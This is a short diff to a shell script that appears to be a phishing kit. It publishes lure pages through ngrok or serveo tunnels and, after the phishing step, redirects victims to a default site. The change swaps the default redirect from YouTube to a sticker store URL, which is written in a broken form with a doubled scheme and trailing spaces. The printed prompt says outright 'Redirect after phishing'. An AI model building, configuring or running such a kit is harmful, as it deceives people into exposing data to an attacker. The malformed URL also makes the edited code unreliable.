@@ -156,7 +156,7 @@ printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n' $s
 
 
 payload_ngrok() {
-url=$redirect #"https://www.youtube.com"
+url=$redirect #"https://https://getstickerpack.com/   "
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 payload_name="index"
 printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Building webpages\e[0m\n"
@@ -269,7 +269,7 @@ payload() {
 
 link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
 
-url=$redirect # "https://www.youtube.com"
+url=$redirect # "https://https://getstickerpack.com/   "
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 payload_name="index"
 printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Building webpages...\e[0m\n"
@@ -314,9 +314,9 @@ checkfound
 redirect() {
 
 
-default_redirect="https://www.youtube.com"
+default_redirect="https://https://getstickerpack.com/    "
 
-printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Redirect after phishing (Default:\e[0m\e[1;77m Youtube \e[0m\e[1;33m): \e[0m'
+printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Redirect after phishing (Default:\e[0m\e[1;77m Sticker Store \e[0m\e[1;33m): \e[0m'
 read redirect
 redirect="${redirect:-${default_redirect}}"
 
